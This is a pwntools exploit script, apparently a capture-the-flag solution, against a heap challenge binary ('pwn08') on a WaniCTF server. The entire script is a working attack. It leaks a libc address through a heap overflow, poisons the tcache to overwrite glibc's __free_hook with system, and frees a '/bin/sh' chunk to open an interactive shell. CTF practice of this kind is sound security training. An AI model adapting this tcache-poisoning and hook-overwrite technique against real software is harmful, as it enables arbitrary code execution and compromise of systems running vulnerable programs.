from pwn import *

binary = "./pwn08"
host ="heap.wanictf.org"
port = 9008
libc = "./libc-2.27.so"

elf = ELF(binary)
context.binary = binary
context.log_level = "info"

commands = """
continue
"""

if len(sys.argv) >= 2 and sys.argv[1] == "r":
	# remote
	s = remote(host, port)
	libc = ELF(libc)
elif len(sys.argv) >= 2 and sys.argv[1] == "d":
	# debug
	s = gdb.debug(binary, commands, env={"LD_PRELOAD": libc})
	# libc = elf.libc
	libc = ELF(libc)
else:
	# local
	s = process(binary,env={"LD_PRELOAD": libc})
	# libc = elf.libc
	libc = ELF(libc)

str_bin_sh = b"/bin/sh\x00"

def add(index, size):
	s.sendlineafter("command?: ", "1")
	s.sendlineafter("index?[0-9]: ", str(index))
	s.sendlineafter("size?: ", str(size))

def edit(index, data):
	s.sendlineafter("command?: ", "2")
	s.sendlineafter("index?[0-9]: ", str(index))
	s.sendafter("memo?: ", data)

def view(index):
	s.sendlineafter("command?: ", "3")
	s.sendlineafter("index?[0-9]: ", str(index))
	return s.recvline()

def delete(index):
	s.sendlineafter("command?: ", "9")
	s.sendlineafter("index?[0-9]: ", str(index))

add(0, 0x10)
add(1, 0x410)
add(2, 0x10)
add(3, 0x10)
add(4, 0x10)

delete(1)
edit(0, b"A"*0x20)
unsorted = unpack(view(0)[0x20:-1].ljust(8,b'\x00'))
log.info("unsorted @ " + hex(unsorted))

libc.address = unsorted - 0x3ebca0

log.info("libc_base @ " + hex(libc.address))
delete(3)
edit(2, b"A"*0x20 + pack(libc.sym["__free_hook"]))
add(5, 0x10)
add(6, 0x10)
edit(6, pack(libc.sym["system"]))
edit(0, str_bin_sh)
delete(0)

sleep(1)
s.interactive()